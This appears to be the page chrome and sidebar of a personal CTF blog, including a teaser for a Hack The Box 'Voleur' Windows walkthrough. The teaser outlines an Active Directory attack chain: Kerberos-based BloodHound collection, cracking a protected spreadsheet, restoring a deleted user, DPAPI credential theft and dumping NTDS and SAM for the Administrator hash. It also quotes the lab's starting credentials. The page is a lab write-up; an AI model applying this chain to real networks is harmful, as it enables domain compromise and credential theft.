class="info-item-2">Voleur (Windows Medium)</div></div><div class="info-2"><div class="info-item-1"> Voleur starts with credentials, but after a nmap you find NTLM is disabled. Using kerberos, we are able to get a bloodhound dump. Checking the shares reveals a xlsx file, we can convert it and crack it. Once done, we get access to a excel file with some users and passwords, one user has be deleted. Once on the box, we lateral move to ldap_svc, and find a user that has been deleted. Using powershell, we restore them and then get a shell using the password found from the xlsx file. Then we do to the next directory in the IT share, and find a archived users directory which hold DPAPI credentials. After obtaining the credentials, we find our user able to access a backup in the next directory that contains the SAM, SECURITY, and NTDS files used to dump the Administrator hash. As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor &#x2F; HollowOct31Nyt Initial...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Jay</div><div class="author-info-description">An aspiring hacker and a CTF player</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">59</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/itzgottabejay" target="_blank" title="Github"><i class="fab fa-github" style="color: #E2E6E6;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/ianberdahl/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #007aff;"></i></a><a class="social-icon" href="https://app.hackthebox.com/profile/420575" target="_blank" title="HackTheBox"><i class="fa-solid fa-cube" style="color: #2dfc04;"></i></a><a class="social-icon" href="https://www.instagram.com/junkie_mayhem/" target="_blank" title="Instagram"><i class="fab fa-instagram" style="color: #833AB4;"></i></a><a class="social-icon" href="https://x.com/deadcyberninja" target="_blank" title="X"><i class="fab fa-x-twitter" style="color: #000404;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I like to put things here for safe keeping 🔐🔐</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Nmap"><span class="toc-number">1.</span> <span class="toc-text">Initial Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enum-of-rr-parker"><span class="toc-number">2.</span> <span class="toc-text">Enum of rr.parker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-way-out-so-it-seemed"><span class="toc-number">3.</span> <span class="toc-text">No way out so it seemed!!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold-with-bb-morgan"><span class="toc-number">4.</span> <span class="toc-text">Foothold with bb.morgan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-ee-reed"><span class="toc-number">5.</span> <span class="toc-text">Shell as ee.reed</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-mm-turner"><span class="toc-number">6.</span> <span class="toc-text">Shell as mm.turner</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mom-said-I%E2%80%99m-allowed-too-Privesc"><span class="toc-number">6.1.</span> <span class="toc-text">Mom said I’m allowed too Privesc!!</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/n8.jpg);"><div id="footer-wrap"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="IM,WATCHING,YOU" data-fontsize="21px" data-random="false" async="async"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Where do you want to go?" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>